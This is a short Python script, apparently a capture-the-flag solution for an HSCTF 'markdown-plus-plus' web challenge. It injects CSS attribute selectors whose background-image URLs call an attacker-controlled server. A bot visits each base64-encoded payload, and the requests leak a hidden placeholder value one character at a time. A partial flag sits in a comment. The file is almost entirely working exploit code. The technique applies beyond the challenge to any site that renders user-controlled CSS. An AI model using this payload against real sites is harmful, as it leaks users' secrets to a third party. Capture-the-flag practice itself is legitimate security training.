import base64
import requests

flag = ""
#flag = "flag{waterfall_bfutsftfejpk"
my_server = ""

for c in "_{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
    css_i = f"[h=red;}}input[placeholder^='{flag + c}']{{background-image:url({my_server}?s={flag + c});}} {flag + c}]"
    res = requests.post("http://web1.hsctf.com:8000/markdown-plus-plus", data={"url": f"http://web1.hsctf.com:8002/display#{base64.b64encode(css_i.encode()).decode()}"})
    #print(res.status_code)
    #print(res.text)